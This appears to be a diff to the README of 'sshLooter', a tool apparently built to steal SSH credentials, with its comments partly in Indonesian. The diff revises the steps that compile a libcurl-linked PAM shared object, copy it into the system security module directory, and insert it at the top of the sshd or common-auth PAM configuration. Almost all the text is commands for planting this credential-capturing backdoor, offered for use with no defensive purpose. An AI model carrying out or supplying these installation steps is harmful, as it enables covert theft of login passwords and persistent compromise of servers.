@@ -23,8 +23,7 @@ sudo dnf install gcc libcurl-devel pam-devel git make
 
 git clone https://github.com/aexdyhaxor/sshLooter.git
 cd sshLooterC
-make
-
+gcc -shared -fPIC looter.c $(curl-config --cflags --libs) -lpam -o looter.so
 
 # Untuk sistem 64-bit (RHEL/CentOS/Rocky)
 sudo cp looter.so /lib64/security/
@@ -32,10 +31,16 @@ sudo cp looter.so /lib64/security/
 # Untuk sistem Ubuntu/Debian
 sudo cp looter.so /lib/security/
 
-sudo nano /etc/pam.d/system-auth
+==========================================================================================
+
+sudo nano /etc/pam.d/common-auth ( Ubuntu / Debian )
+sudo nano /etc/pam.d/sshd ( CentOS / RHEL / Alma / Rocky )
+
+<img width="729" height="628" alt="image" src="https://github.com/user-attachments/assets/ef713525-0818-4024-9fd0-19ca4efc2330" />
+
 
 # Tambahkan di bagian atas file
 auth optional /lib64/security/looter.so
 account optional /lib64/security/looter.so
 
-<img width="1116" height="626" alt="image" src="https://github.com/user-attachments/assets/301a273c-3a7b-4486-bb26-accceea968cf" />
+
